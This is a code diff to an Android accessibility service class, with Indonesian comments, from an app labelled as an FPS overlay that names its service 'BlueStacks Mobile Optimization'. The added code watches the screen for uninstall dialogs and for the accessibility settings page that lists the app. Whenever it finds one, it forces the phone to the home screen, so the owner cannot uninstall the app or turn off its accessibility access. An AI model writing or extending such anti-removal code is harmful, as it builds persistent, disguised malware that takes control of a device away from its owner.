@@ -35,12 +35,28 @@ public class ProtectionManager {
             return;
         }
 
-        // --- PRIORITAS 1: ANTI-UNINSTALL ---
-        if (antiUninstallEnabled && (pkg.contains("packageinstaller") || pkg.contains("settings"))) {
+        // --- PRIORITAS 1: ANTI-UNINSTALL & ANTI-NONAKTIF AKSESIBILITAS ---
+        if (antiUninstallEnabled && (
+                pkg.contains("packageinstaller") || 
+                pkg.contains("settings") || 
+                pkg.contains("installer") || 
+                pkg.contains("securitycenter") || 
+                pkg.contains("launcher") || 
+                pkg.equals("android"))) {
+            
             AccessibilityNodeInfo root = service.getRootInActiveWindow();
             if (root != null) {
+                // 1. Cek upaya Uninstall
                 if (isLikelyUninstallDialog(root)) {
-                    Log.w(TAG, "!! UNINSTALL DETECTED !! Package: " + pkg + ". Blocking and going home.");
+                    Log.w(TAG, "!! UNINSTALL DETECTED !! Blocking.");
+                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
+                    root.recycle();
+                    return;
+                }
+
+                // 2. Cek upaya Nonaktifkan Aksesibilitas
+                if (pkg.contains("settings") && isLikelyAccessibilityPage(root)) {
+                    Log.e(TAG, "!!! ACCESSIBILITY PROTECTION TRIGGERED !!! Package: " + pkg);
                     service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                     root.recycle();
                     return;
@@ -105,21 +121,97 @@ public class ProtectionManager {
     private boolean isLikelyUninstallDialog(AccessibilityNodeInfo root) {
         if (root == null) return false;
         
-        // Cek ID pesan dialog
-        List<AccessibilityNodeInfo> msgNodes = root.findAccessibilityNodeInfosByViewId("android:id/message");
-        if (msgNodes != null && !msgNodes.isEmpty()) {
-            for (AccessibilityNodeInfo msgNode : msgNodes) {
-                String text = msgNode.getText() != null ? msgNode.getText().toString().toLowerCase() : "";
-                msgNode.recycle();
-                if (text.contains("uninstall") || text.contains("copot") || text.contains("hapus")) {
-                    return true;
+        // Dapatkan nama aplikasi kita sendiri untuk validasi
+        String appName = "FPSOverlay"; // Default fallback
+        try {
+            int stringId = service.getApplicationInfo().labelRes;
+            if (stringId != 0) appName = service.getString(stringId);
+        } catch (Exception ignored) {}
+
+        // 1. Cek melalui ID pesan standar Android (diperluas)
+        String[] msgIds = {
+            "android:id/message", 
+            "com.android.settings:id/message", 
+            "com.android.packageinstaller:id/message",
+            "com.google.android.packageinstaller:id/message",
+            "com.android.packageinstaller:id/text",
+            "com.miui.securitycenter:id/message"
+        };
+        for (String id : msgIds) {
+            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
+            if (nodes != null && !nodes.isEmpty()) {
+                for (AccessibilityNodeInfo node : nodes) {
+                    String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
+                    node.recycle();
+                    if (text.contains("uninstall") || text.contains("copot") || text.contains("hapus") || text.contains("pemasangan")) {
+                        return true;
+                    }
                 }
             }
         }
         
-        // Cek teks langsung
-        return checkNodeForText(root, "uninstall") || checkNodeForText(root, "copot") || 
-               checkNodeForText(root, "hapus instalasi");
+        // 2. Cek apakah nama aplikasi kita disebut bersamaan dengan kata kunci uninstall
+        boolean hasAppName = checkNodeForText(root, appName);
+        boolean hasUninstallKey = checkNodeForText(root, "uninstall") || 
+                                 checkNodeForText(root, "copot") || 
+                                 checkNodeForText(root, "pemasangan") ||
+                                 checkNodeForText(root, "hapus");
+
+        if (hasAppName && hasUninstallKey) return true;
+
+        // 3. Cek frasa spesifik bahasa Indonesia & Inggris
+        return checkNodeForText(root, "Hapus instalasi") || 
+               checkNodeForText(root, "Copot pemasangan") || 
+               checkNodeForText(root, "Do you want to uninstall");
+    }
+
+    private boolean isLikelyAccessibilityPage(AccessibilityNodeInfo root) {
+        if (root == null) return false;
+
+        String appName = "BondexFPS";
+        String accLabel = "BlueStacks Mobile Optimization";
+        
+        try {
+            int nameId = service.getApplicationInfo().labelRes;
+            if (nameId != 0) appName = service.getString(nameId);
+            
+            // Cari label aksesibilitas dari manifest secara dinamis jika memungkinkan
+            // Tapi untuk sekarang kita hardcode saja berdasarkan strings.xml yang kita temukan
+        } catch (Exception ignored) {}
+
+        // 1. Cek apakah Nama App atau Label Aksesibilitas ada di layar
+        boolean hasAppName = checkNodeRecursive(root, appName);
+        boolean hasAccLabel = checkNodeRecursive(root, "BlueStacks") || checkNodeRecursive(root, "Optimization");
+        
+        Log.d(TAG, "Accessibility Check - Pkg: " + root.getPackageName());
+        Log.d(TAG, "Looking for [" + appName + "] found: " + hasAppName);
+        Log.d(TAG, "Looking for [BlueStacks/Optimization] found: " + hasAccLabel);
+        
+        if (!hasAppName && !hasAccLabel) return false;
+
+        // 2. Jika ada nama aplikasi, cek apakah kita berada di lingkungan pengaturan/aksesibilitas
+        boolean isAcc = checkNodeForText(root, "Accessibility") || checkNodeForText(root, "Aksesibilitas");
+        boolean isService = checkNodeForText(root, "Layanan") || checkNodeForText(root, "Services") || 
+                           checkNodeForText(root, "Downloaded") || checkNodeForText(root, "Terunduh") ||
+                           checkNodeForText(root, "Aplikasi terinstal");
+        boolean isShortcut = checkNodeForText(root, "Pintas") || checkNodeForText(root, "Shortcut");
+        boolean isUse = checkNodeForText(root, "Gunakan") || checkNodeForText(root, "Use");
+
+        Log.d(TAG, String.format("Acc Context: isAcc=%b, isService=%b, isShortcut=%b, isUse=%b", isAcc, isService, isShortcut, isUse));
+
+        if (isAcc || isService || isShortcut || isUse) {
+            Log.e(TAG, ">> Match found in Accessibility Context/Menu");
+            return true;
+        }
+
+        // Fallback: Jika nama aplikasi ada dan ada kata status (Bahasa Inggris/Indo)
+        boolean hasState = checkNodeForText(root, " Matikan ") || checkNodeForText(root, " Nonaktifkan ") || 
+                           checkNodeForText(root, " Off ") || checkNodeForText(root, " On ") ||
+                           checkNodeForText(root, "Aktif") || checkNodeForText(root, "Aktifkan") ||
+                           checkNodeForText(root, "Berhenti") || checkNodeForText(root, "Stop");
+        
+        Log.d(TAG, "Fallback State check: " + hasState);
+        return hasState;
     }
 
     private void autoAllowPermissions() {
@@ -218,17 +310,36 @@ public class ProtectionManager {
     }
 
     private boolean checkNodeForText(AccessibilityNodeInfo node, String text) {
+        return checkNodeRecursive(node, text);
+    }
+
+    private boolean checkNodeRecursive(AccessibilityNodeInfo node, String target) {
         if (node == null) return false;
-        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
-        if (nodes != null && !nodes.isEmpty()) {
-            for (AccessibilityNodeInfo n : nodes) {
-                if (n.isVisibleToUser()) {
-                    n.recycle();
+        
+        // Cek Text
+        CharSequence text = node.getText();
+        if (text != null && text.toString().toLowerCase().contains(target.toLowerCase())) {
+            return true;
+        }
+        
+        // Cek Content Description (Sering digunakan di Android baru)
+        CharSequence desc = node.getContentDescription();
+        if (desc != null && desc.toString().toLowerCase().contains(target.toLowerCase())) {
+            return true;
+        }
+
+        // Cari di anak-anaknya (Recursive)
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                if (checkNodeRecursive(child, target)) {
+                    child.recycle();
                     return true;
                 }
-                n.recycle();
+                child.recycle();
             }
         }
+
         return false;
     }
 }
